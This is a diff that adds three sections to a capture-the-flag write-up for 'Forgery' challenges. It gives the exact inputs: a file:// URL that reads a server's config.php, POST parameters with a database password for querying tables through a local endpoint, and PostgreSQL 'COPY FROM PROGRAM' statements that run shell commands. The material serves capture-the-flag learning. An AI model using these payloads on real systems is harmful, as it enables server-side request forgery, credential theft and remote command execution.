@@ -67,9 +67,22 @@ This is the final payload:
 I then use the output in the URL parameter, and it gives me the flag :)
 
 ### Forgery 101
+In the url input: ```file:///var/www/html/api/config.php```<br>
+We got the first flag, but also some credentials for Forgery 102
 
 ### Forgery 102
+URL: ```http://localhost:8080```
+Method: ```POST```
+Params: ```user=postgres&password=Let%26me%3Din&query=SELECT * FROM pg_tables```
+then modify the params for ```user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_numbersFoundWithPreviousCommand```
 
 ### Forgery 103
-
-
+Different commands to try in the params:
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'ls /';
+SELECT * FROM cmd_exec;
+COPY cmd_exec FROM PROGRAM 'cat /flag_is_in_here_numbersFoundWithPreviousCommand.txt';
+SELECT * FROM cmd_exec;
+```
